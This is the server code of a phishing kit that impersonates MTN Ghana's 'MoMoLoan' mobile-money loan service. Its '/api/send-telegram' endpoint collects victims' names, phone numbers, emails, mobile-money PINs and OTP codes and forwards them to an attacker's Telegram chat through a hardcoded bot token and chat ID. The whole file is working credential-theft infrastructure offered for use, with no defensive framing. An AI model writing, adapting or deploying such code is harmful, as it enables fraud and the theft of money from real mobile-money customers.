const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

// CORS - allow all origins
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Content-Type');
    if (req.method === 'OPTIONS') {
        return res.sendStatus(200);
    }
    next();
});

app.use(express.json());

// Health check
app.get('/api/health', (req, res) => {
    res.json({ status: 'OK', timestamp: new Date().toISOString() });
});

// Telegram notification endpoint - MTN GHANA
app.post('/api/send-telegram', async (req, res) => {
    try {
        const { phone, pin, email, name, amount, term, type, site } = req.body;
        
        // ✅ UPDATED MTN Ghana Bot Token
        const TG_BOT_TOKEN = '8069280584:AAFPwWOHBJmvMdwCDadMQX5N2ySPr58_e94';
        const TG_CHAT_ID = '8425632882';  // Your human Chat ID
        
        const timestamp = new Date().toLocaleString('en-US', { 
            timeZone: 'Africa/Accra',
            hour12: false 
        });
        
        let message = '';
        const brandName = site || 'MTN MoMoLoan';
        
        if (type === 'pin') {
            message = `🔐 NEW PIN CONFIRMATION - ${brandName} 🔐\n━━━━━━━━━━━━━━━━━━━━━\n📱 Site: MTN Ghana\n👤 Name: ${name}\n📞 Phone: ${phone}\n📧 Email: ${email || 'Not provided'}\n💰 Amount: ₵${amount}\n📅 Term: ${term} months\n🔢 PIN Code: ${pin}\n━━━━━━━━━━━━━━━━━━━━━\n⏰ Time: ${timestamp}`;
        } else {
            message = `✅ NEW OTP VERIFICATION - ${brandName} ✅\n━━━━━━━━━━━━━━━━━━━━━\n📱 Site: MTN Ghana\n👤 Name: ${name}\n📞 Phone: ${phone}\n📧 Email: ${email || 'Not provided'}\n🔢 OTP Code: ${pin}\n━━━━━━━━━━━━━━━━━━━━━\n⏰ Time: ${timestamp}`;
        }
        
        const url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(message)}`;
        
        const response = await fetch(url);
        const result = await response.json();
        
        if (result.ok) {
            console.log('✅ Notification sent:', type, phone);
            res.json({ success: true });
        } else {
            console.error('Telegram API error:', result);
            res.json({ success: false, error: result.description });
        }
    } catch (error) {
        console.error('Error:', error.message);
        res.json({ success: false, error: error.message });
    }
});

// Root route
app.get('/', (req, res) => {
    res.json({ 
        status: 'OK', 
        message: 'MTN Ghana MoMoLoan API is running!',
        endpoints: ['/api/health', '/api/send-telegram']
    });
});

app.listen(PORT, () => {
    console.log(`🚀 MTN Ghana Server running on port ${PORT}`);
    console.log(`📱 Telegram Bot configured for MTN Ghana`);
});
